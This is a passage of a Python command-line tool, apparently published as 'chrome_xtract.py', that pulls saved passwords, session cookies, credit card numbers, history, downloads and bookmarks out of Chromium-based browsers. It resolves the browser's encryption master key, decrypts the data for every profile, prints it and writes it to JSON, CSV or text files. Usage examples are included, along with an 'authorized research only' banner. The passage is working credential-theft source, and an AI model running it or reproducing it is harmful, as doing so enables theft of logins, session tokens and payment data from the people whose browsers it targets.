                "SELECT encrypted_value FROM cookies LIMIT 5"
            )
            for row in rows:
                raw = bytes(row["encrypted_value"] or b"")
                if raw[:3] == b"v20": return "v20"
                if raw[:3] == b"v10": return "v10"
    return "v10"  # safe default


# =============================================================================
# Master key resolver
# =============================================================================
def resolve_master_key(local_state: str, blob_type: str) -> bytes:
    if blob_type == "v20":
        return get_master_key_v20(local_state)
    else:
        return get_master_key_v10(local_state)


# =============================================================================
# Print helpers
# =============================================================================
def _print_table(rows: list[dict], cols: list[str], title: str) -> None:
    if not rows:
        return
    print(f"\n{C.head('  ── ' + title + ' ──')}")
    widths = {c: len(c) for c in cols}
    for r in rows:
        for c in cols:
            widths[c] = max(widths[c], len(str(r.get(c, ""))))

    sep = "  "
    hdr = sep.join(f"{c:<{widths[c]}}" for c in cols)
    bar = sep.join("-" * widths[c]     for c in cols)

    print(f"\n{C.BLD}{hdr}{C.RST}")
    print(f"{C.DIM}{bar}{C.RST}")
    for r in rows:
        print(sep.join(f"{str(r.get(c,'')):<{widths[c]}}" for c in cols))
    print()


def print_results(all_results: dict[str, list[dict]]) -> None:
    col_map = {
        "passwords" : ["Profile", "URL", "Username", "Password"],
        "cookies"   : ["Profile", "Host", "Name", "Value", "Expires", "Secure"],
        "history"   : ["Profile", "LastVisit", "VisitCount", "Title", "URL"],
        "downloads" : ["Profile", "StartTime", "Size", "FilePath", "SourceURL"],
        "bookmarks" : ["Profile", "Folder", "Name", "URL", "Added"],
        "cards"     : ["Profile", "NameOnCard", "Number", "ExpMonth", "ExpYear"],
    }
    for key, rows in all_results.items():
        if rows:
            _print_table(rows, col_map.get(key, list(rows[0].keys())), key.upper())


# =============================================================================
# Output — save to file
# =============================================================================
def save_output(all_results: dict[str, list[dict]], path: str) -> None:
    ext  = os.path.splitext(path)[1].lower()
    flat = [r for rows in all_results.values() for r in rows]

    if ext == ".json":
        with open(path, "w", encoding="utf-8") as f:
            json.dump(
                {k: v for k, v in all_results.items() if v},
                f, indent=2, ensure_ascii=False
            )

    elif ext == ".csv":
        import csv
        if not flat:
            print(C.warn("Nothing to write."))
            return
        fieldnames = list(flat[0].keys())
        seen = set()
        all_keys: list[str] = []
        for r in flat:
            for k in r.keys():
                if k not in seen:
                    seen.add(k)
                    all_keys.append(k)
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=all_keys, extrasaction="ignore")
            w.writeheader()
            w.writerows(flat)

    else:  # plain text
        with open(path, "w", encoding="utf-8") as f:
            for section, rows in all_results.items():
                if not rows:
                    continue
                f.write(f"\n{'='*60}\n  {section.upper()}\n{'='*60}\n\n")
                for r in rows:
                    f.write(" | ".join(f"{k}={v}" for k, v in r.items() if k != "Type") + "\n")

    print(C.ok(f"Saved {len(flat)} record(s) → {path}"))


# =============================================================================
# Summary
# =============================================================================
def print_summary(all_results: dict[str, list[dict]], browser_display: str) -> None:
    print(f"\n{C.head('  ── EXTRACTION SUMMARY ──')}\n")
    print(f"  {'Browser':<12}: {browser_display}")
    print(f"  {'User':<12}: {os.environ.get('USERNAME', '?')}")
    total = 0
    for key, rows in all_results.items():
        if rows is not None:
            cnt = len(rows)
            total += cnt
            status = C.ok(str(cnt)) if cnt else C.warn("0")
            print(f"  {key.capitalize():<12}: {status}")
    print(f"  {'Total':<12}: {C.BLD}{total}{C.RST}")
    print()


# =============================================================================
# Banner
# =============================================================================
BANNER = rf"""
{C.CYN}   _____ _                              _  __  ___           __
  / ___/| |_  _ __ ___   _ __ ___  ___| |/ /_/ _ \ __  __ / /_
 | |    | ' \| '__/ _ \ | '_ ` _ \/ _ \ | '__/ /_\ \\ \/ // __|
 | |___ | | || | | (_) || | | | | |  __/ | |  |  _  | >  < \__ \
  \____||_|_||_|  \___/ |_| |_| |_|\___|_|_|  |_| |_|/_/\_\ ___/{C.RST}

  {C.DIM}Browser Data Extractor  ·  github.com/mohanmg04/browser-data-extractor{C.RST}
  {C.YEL}For authorized security research and laboratory environments only.{C.RST}
"""


# =============================================================================
# Main entry point
# =============================================================================
def chrome_xtract(
    browser:     str,
    types:       set[str],
    verbose:     bool       = False,
    hide_banner: bool       = False,
    output:      str | None = None,
) -> None:

    global _V
    _V = verbose

    if not hide_banner:
        print(BANNER)

    display = BROWSER_DISPLAY.get(browser.lower(), browser)
    print(C.info(f"Target   : {C.BLD}{display}{C.RST}"))
    print(C.info(f"Extract  : {C.BLD}{', '.join(sorted(types))}{C.RST}"))
    _log(f"User     : {os.environ.get('USERNAME','?')}")
    _log(f"SID      : {get_current_sid()}")
    _log(f"Admin    : {is_admin()}")
    _log(f"SYSTEM   : {is_system()}")

    paths = BROWSER_PATHS.get(browser.lower())
    if not paths:
        print(C.err(f"Unsupported browser: {browser}")); return

    local_state = paths["local_state"]
    user_data   = paths["user_data"]

    if not os.path.exists(local_state):
        print(C.err(f"Local State not found:\n  {local_state}")); return
    if not os.path.isdir(user_data):
        print(C.err(f"User Data directory not found:\n  {user_data}")); return

    profiles = get_profile_dirs(user_data)
    if not profiles:
        print(C.err("No browser profiles found.")); return

    _log(f"Profiles : {[os.path.basename(p) for p in profiles]}")
    print(C.info(f"Profiles : {len(profiles)} found"))

    # ── Determine encryption version ─────────────────────────────────────────
    needs_decryption = bool(types & {"passwords", "cookies", "cards"})
    master_key: bytes | None = None

    if needs_decryption:
        blob_type = detect_blob_type(user_data, browser)
        print(C.info(f"Blob type: {blob_type}"))

        try:
            master_key = resolve_master_key(local_state, blob_type)
            print(C.ok("Master key decrypted"))
        except PermissionError as exc:
            print(C.err(str(exc))); return
        except Exception as exc:
            print(C.err(f"Master key error: {exc}")); return

    # ── Extract per-profile ───────────────────────────────────────────────────
    all_results: dict[str, list[dict]] = {
        "passwords" : [],
        "cookies"   : [],
        "history"   : [],
        "downloads" : [],
        "bookmarks" : [],
        "cards"     : [],
    }

    for prof in profiles:
        pname = os.path.basename(prof)
        _log(f"\nProfile: {pname}")

        if "passwords" in types and master_key:
            r = extract_passwords(prof, browser, pname, master_key)
            all_results["passwords"].extend(r)
            _log(f"  passwords: {len(r)}")

        if "cookies" in types and master_key:
            r = extract_cookies(prof, browser, pname, master_key)
            all_results["cookies"].extend(r)
            _log(f"  cookies:   {len(r)}")

        if "history" in types:
            r = extract_history(prof, browser, pname)
            all_results["history"].extend(r)
            _log(f"  history:   {len(r)}")

        if "downloads" in types:
            r = extract_downloads(prof, browser, pname)
            all_results["downloads"].extend(r)
            _log(f"  downloads: {len(r)}")

        if "bookmarks" in types:
            r = extract_bookmarks(prof, pname)
            all_results["bookmarks"].extend(r)
            _log(f"  bookmarks: {len(r)}")

        if "cards" in types and master_key:
            r = extract_credit_cards(prof, browser, pname, master_key)
            all_results["cards"].extend(r)
            _log(f"  cards:     {len(r)}")

    # Filter out unrequested types
    active = {k: v for k, v in all_results.items() if k in types and v}

    # ── Print + Summary ───────────────────────────────────────────────────────
    print_summary(
        {k: all_results[k] for k in types if k in all_results},
        display
    )
    print_results(active)

    if output and active:
        save_output(active, output)
    elif not active:
        print(C.warn("No data extracted — check permissions and data types."))


# =============================================================================
# CLI
# =============================================================================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="chrome_xtract.py — Chromium Browser Data Extractor",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
data types:
  passwords  Saved login credentials
  cookies    Session and authentication cookies
  history    Browsing history (last 2000 entries)
  downloads  Download history
  bookmarks  Saved bookmarks
  cards      Saved credit/debit card numbers
  all        All of the above (default)

examples:
  python chrome_xtract.py -Browser chrome
  python chrome_xtract.py -Browser edge    -Type passwords,cookies
  python chrome_xtract.py -Browser brave   -Type all -Output report.json
  python chrome_xtract.py -Browser chrome  -Type history,bookmarks -Output history.csv
  python chrome_xtract.py -Browser chromium -Type all -Verbose -HideBanner
        """,
    )
    parser.add_argument(
        "-Browser",
        required=True,
        choices=list(BROWSER_PATHS.keys()),
        metavar="BROWSER",
        help="chrome | edge | brave | chromium | cft",
    )
    parser.add_argument(
        "-Type",
        default="all",
        metavar="TYPE[,TYPE,...]",
        help="Comma-separated: passwords,cookies,history,downloads,bookmarks,cards,all  (default: all)",
    )
    parser.add_argument("-Verbose",    action="store_true", help="Verbose / debug output")
    parser.add_argument("-HideBanner", action="store_true", help="Suppress the banner")
    parser.add_argument(
        "-Output",
        metavar="FILE",
        help="Save extracted data to file (.json / .csv / .txt)",
    )

    args = parser.parse_args()

    # Parse -Type
    raw_types = {t.strip().lower() for t in args.Type.split(",")}
    if "all" in raw_types:
        chosen_types = VALID_TYPES - {"all"}
    else:
        invalid = raw_types - VALID_TYPES
        if invalid:
            parser.error(f"Unknown type(s): {', '.join(invalid)}. Valid: {', '.join(sorted(VALID_TYPES))}")
        chosen_types = raw_types

    chrome_xtract(
        browser     = args.Browser,
        types       = chosen_types,
        verbose     = args.Verbose,
        hide_banner = args.HideBanner,
        output      = args.Output,
    )
